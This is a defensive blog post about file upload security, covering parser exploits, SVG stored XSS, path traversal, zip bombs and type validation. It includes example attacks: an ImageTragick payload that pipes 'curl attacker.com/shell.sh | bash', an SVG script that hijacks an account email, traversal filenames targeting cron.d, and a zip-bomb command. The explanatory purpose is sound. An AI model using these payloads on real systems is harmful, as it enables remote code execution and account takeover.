---
title: How to Not Get Hacked Through File Uploads
date: 2026-03-14T13:43:58.000Z
description: >-
  How attackers exploit file uploads through parser vulnerabilities, stored XSS,
  path traversal, and zip bombs, with practical defenses and code examples for
  each.
tags:
  - application-security
  - don't get hacked
readTime: 8
keywords:
  - file upload security
  - file upload vulnerabilities
  - secure file uploads
  - path traversal
  - upload attack surface
  - file type validation
  - XSS
  - input validation
faq:
  - q: "Why are file uploads a security risk?"
    a: "Every file gets parsed and processed by multiple systems independently (image libraries, file systems, CDNs, browsers), and a crafted file can exploit vulnerabilities in any of them, even when your own application code is correct."
  - q: "How should you validate uploaded file types?"
    a: "Inspect the file's magic bytes using a library like python-magic or file-type, not the Content-Type header or file extension, which are client-controlled and trivially spoofed. Combine this with a strict allowlist of accepted types."
  - q: "What is a zip bomb and how do you defend against it?"
    a: "A zip bomb is a small compressed file that expands to an enormous size when decompressed, exhausting disk or memory. Defend by streaming the archive and aborting extraction if the decompressed size exceeds a threshold."
  - q: "How do you prevent stored XSS through file uploads?"
    a: "Serve uploaded files from a separate domain that shares no cookies or session state with your application, so any embedded scripts run in an isolated origin with no access to user sessions. Set Content-Disposition to attachment and X-Content-Type-Options to nosniff."
---

You add a profile picture upload to your app. The code is straightforward: accept the file, check the extension, resize it, store it, serve it. What makes file uploads dangerous is that every step in that pipeline is an independent attack surface, and most of them are not in your code.

When you accept a form field, the risk is in how your code handles a string. When you accept a file, the risk extends to every system that touches it: your image library, your file system, your CDN, the browser that eventually renders it to another user. A file that is safe for one of those consumers can be exploitable by another. The rest of this post walks through the four main ways upload features get abused, with defenses for each.

## Parser Exploits

Your image processing library reads the uploaded file's header to determine the format, allocates memory based on declared dimensions, and decodes the compressed pixel data. A crafted file can exploit any of these steps.

The [ImageTragick](https://imagetragick.com/) vulnerability ([CVE-2016-3714](https://nvd.nist.gov/vuln/detail/CVE-2016-3714)) is a good example. ImageMagick's delegate system passed certain file formats to external programs via shell commands. A file like this, saved with an image extension and uploaded as a profile picture, would execute the embedded command during resize:

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|curl attacker.com/shell.sh | bash")'
pop graphic-context
```

The server processes what it thinks is an image, and runs attacker-controlled shell commands. The upload handler's code is correct; the vulnerability is in the library it calls. Similar parser bugs appear regularly in ImageMagick, libpng, libjpeg, libwebp, and ffmpeg. In 2023, a heap buffer overflow in libwebp's Huffman decoding logic ([CVE-2023-4863](https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html)) was exploited in the wild before patches were available, affecting every application that processed WebP images.

The defense is to run file processing in a restricted environment: a container with limited permissions, a serverless function with a timeout and memory cap, or a subprocess with resource constraints. Set explicit timeouts so a single adversarial file cannot occupy a processing worker indefinitely. For ImageMagick specifically, the `policy.xml` configuration restricts which formats, codecs, and resource limits are enforced, substantially reducing the attack surface ([ImageMagick security policy documentation](https://imagemagick.org/script/security-policy.php)). Keeping image processing dependencies updated matters more for upload handlers than for almost any other part of your application, because the vulnerability is in the library, not in your code.

## Content That Browsers Execute

File uploads can deliver stored cross-site scripting that bypasses the usual XSS defenses entirely. If your application accepts SVG files and serves them from the same origin as your main application, any JavaScript embedded in the SVG executes in the user's browser with full access to their session. The SVG specification explicitly supports `<script>` elements and event handlers like `onload`, so a file like this is a valid SVG:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('/api/account/email', {
      method: 'PUT',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: 'attacker@evil.com'})
    })
  </script>
</svg>
```

If another user's browser loads this file from `yourapp.com/uploads/avatar.svg`, the script runs in the context of `yourapp.com` and can make authenticated API requests, read the DOM, and access localStorage. HTML files carry the same risk if accepted. Template engines and output escaping, which normally prevent XSS in rendered pages, do nothing here because the browser loads the uploaded file directly.

The fix is to serve uploaded files from a separate domain (for example, `uploads.yourcdn.com`) that shares no cookies or authentication state with your application. Even if a file contains executable content, it runs in an isolated origin with no access to user sessions. In most modern deployments, storing uploads in object storage and serving them through pre-signed URLs or a CDN achieves this isolation by default. Setting `Content-Disposition: attachment` on file types that should be downloaded rather than displayed, and `X-Content-Type-Options: nosniff` to prevent browsers from MIME-type sniffing the response into an executable content type, closes the remaining vectors.

## Filenames and Path Traversal

The [previous post on injection](/2026/03/06/malicious-user-input/) covered path traversal as a general pattern, but file uploads deserve specific attention because the filename arrives directly from the client and participates in file system operations that other string inputs rarely touch.

If your upload handler uses the original filename to construct the storage path:

```python
path = os.path.join(UPLOAD_DIR, request.file.filename)
```

a filename like `../../../etc/cron.d/backdoor` can write outside the intended directory, potentially overwriting configuration files, scheduled tasks, or application code.

Archive extraction introduces the same problem at a different layer. Zip files and tar archives contain internal path entries for each member file, and those entries can include traversal sequences. The [Zip Slip vulnerability](https://security.snyk.io/research/zip-slip-vulnerability), documented by Snyk in 2018, showed that extraction libraries in Java, .NET, Ruby, JavaScript, and Go followed embedded paths during extraction without validating whether the resolved destination stayed within the target directory. Here is what a malicious zip entry looks like versus what your extraction code expects:

```
# What your code expects:
uploads/report.csv
uploads/summary.pdf

# What the zip actually contains:
../../../etc/cron.d/backdoor
../../../var/www/app/config.py
```

The fix for filenames is to generate a random identifier (UUID or similar) as the stored filename and discard the original entirely. If you need to display the original name to users, store it in your database as metadata, never as a file system path. For archives, resolve the full destination path and verify it stays under the target directory before writing:

```python
import os
import zipfile

def safe_extract(zip_path, target_dir):
    with zipfile.ZipFile(zip_path) as zf:
        for entry in zf.namelist():
            dest = os.path.realpath(os.path.join(target_dir, entry))
            if not dest.startswith(os.path.realpath(target_dir) + os.sep):
                raise ValueError(f"Path traversal detected: {entry}")
        zf.extractall(target_dir)
```

## Resource Exhaustion and Cost Amplification

File uploads give attackers a direct mechanism for consuming your infrastructure resources, because each upload can trigger storage writes, compute-intensive processing, and outbound network transfers that cost you money.

The classic example is the zip bomb: a compressed file that passes a size limit check at upload time but expands to an enormous volume when decompressed. You can create one in a single command:

```bash
# Creates a 10MB file that decompresses to 10GB
dd if=/dev/zero bs=1M count=10000 | gzip > bomb.gz
```

Through nested compression layers, the ratio gets worse. A 42KB zip file known as [42.zip](https://en.wikipedia.org/wiki/Zip_bomb) decompresses to 4.5 petabytes.

Enforce file size limits at the reverse proxy or load balancer level so oversized files are rejected before reaching your application. Set per-user and per-IP upload rate limits. For archives, stream the extraction and abort if the running decompressed total exceeds a threshold.

## Validate Before Anything Else

The defenses above target specific attack categories, but the first line of defense applies to all of them: validate the file's actual type before your application does anything with it.

The `Content-Type` header and file extension are both client-controlled and trivially spoofed. Reliable type detection means inspecting the file's magic bytes (the first bytes that identify its format) using a library such as `python-magic`, `file-type` for Node.js, or the system `file` command. This is imperfect for formats that share magic bytes or for polyglot files, but it eliminates the most common bypass where an attacker renames `shell.php` to `shell.jpg` or sets the content type to `image/jpeg` on a non-image file. Combine content-based detection with a strict allowlist: if your feature needs JPEG and PNG, reject everything else, and reject SVG and HTML explicitly unless your product specifically requires them.

For applications where users upload files that other users download (document sharing, messaging, collaboration tools), run an antivirus scan before making files available.

---

**Upload security checklist:**

- File type validated by magic bytes, not by extension or MIME header
- Strict allowlist of accepted file types; SVG and HTML rejected unless explicitly needed
- Files renamed to random identifiers on upload; original filename stored as metadata only
- Uploaded files served from a separate domain with no shared session state
- `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff` headers set
- File size limits enforced at the reverse proxy or load balancer level
- Per-user upload rate limits in place
- Archive extraction validates that resolved paths stay within the target directory
- File processing runs in sandboxed environments with timeouts and resource limits
- Image processing dependencies kept up to date
- Antivirus scanning enabled for user-to-user file sharing features

Securing file uploads requires attention to input validation, dependency management, and infrastructure cost control simultaneously, because a gap in any one of them is independently exploitable. The checklist above is a reasonable starting point for auditing an existing upload pipeline or designing a new one. For a broader security review covering secrets, authorization, webhooks, and rate limiting, see [A Practical Security Audit for Builders](/2026/02/14/quick-security-audit/).
